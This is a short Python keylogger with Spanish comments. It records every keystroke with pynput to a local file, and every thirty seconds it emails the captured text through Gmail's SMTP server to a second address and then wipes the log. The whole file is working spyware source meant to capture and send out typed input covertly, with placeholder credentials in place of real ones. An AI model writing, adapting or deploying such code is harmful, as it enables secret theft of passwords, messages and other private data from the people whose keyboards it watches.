import smtplib
import sys
import logging
import time
import datetime
from pynput import keyboard

# Configuración
carpeta_destino = "keylog.txt"
segundos_espera = 30
timeout = time.time() + segundos_espera

# Configuración de logging para almacenar las teclas
logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')

def TimeOut():
    return time.time() > timeout

def EnviarEmail():
    try:
        with open(carpeta_destino, 'r+') as f:
            fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            data = f.read()
            data = data.replace('Space', ' ')
            data = data.replace('\n', '')
            mensaje = f'Mensaje capturado a las: {fecha}\n{data}'
            print(mensaje)
            
            # Enviar correo
            crearEmail('correo1@gmail.com', 'contraseña_app', 'correo_2@gmail.com', f'Nueva captura: {fecha}', mensaje)
            
            f.seek(0)
            f.truncate()
    except Exception as e:
        print(f"Error al enviar el correo: {e}")

def crearEmail(user, passw, recep, subj, body):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(user, passw)
        email = f"From: {user}\nTo: {recep}\nSubject: {subj}\n\n{body}"
        server.sendmail(user, recep, email)
        server.quit()
        print('Correo enviado con éxito!')
    except Exception as e:
        print(f"Error al enviar correo: {e}")

def on_press(key):
    try:
        logging.info(str(key).replace("'", ""))
    except Exception as e:
        print(f"Error al registrar la tecla: {e}")

# Iniciar la escucha del teclado
listener = keyboard.Listener(on_press=on_press)
listener.start()

while True:
    if TimeOut():
        EnviarEmail()
        timeout = time.time() + segundos_espera
